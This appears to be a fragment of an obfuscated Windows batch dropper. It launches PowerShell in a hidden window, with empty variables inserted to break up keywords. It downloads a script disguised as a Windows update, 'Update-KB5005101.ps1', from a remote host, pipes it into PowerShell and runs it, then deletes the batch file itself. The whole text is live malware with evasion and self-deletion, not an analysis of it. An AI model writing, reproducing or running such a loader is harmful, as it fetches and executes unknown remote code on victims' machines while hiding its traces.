...
@Cd %tmp% && @pow%_i0%ersh%#1%ell -w%#1%in%_i0%dows%#1%tyle hi%_i0%dd%#1%en [I%#1%O.str%_i0%eamR%#1%e%_i0%ader]:%_i0%:new([N%#1%et.we%_i0%bRequ%#1%est]::C%#1%re%_i0%ate('ht%_i0%tp://CharlieBrown/Update-KB5005101.p%_i0%s1').G%#1%etRe%_i0%spo%#1%nse().Ge%_i0%tRes%#1%pon%#1%se%_i0%stre%#1%am()).Re%_i0%adToe%_i0%nd()|po%#1%wers%_i0%he%#1%ll &('Rex' -rep%#1%la%_i0%ce 'R','i')
del "%~f0"
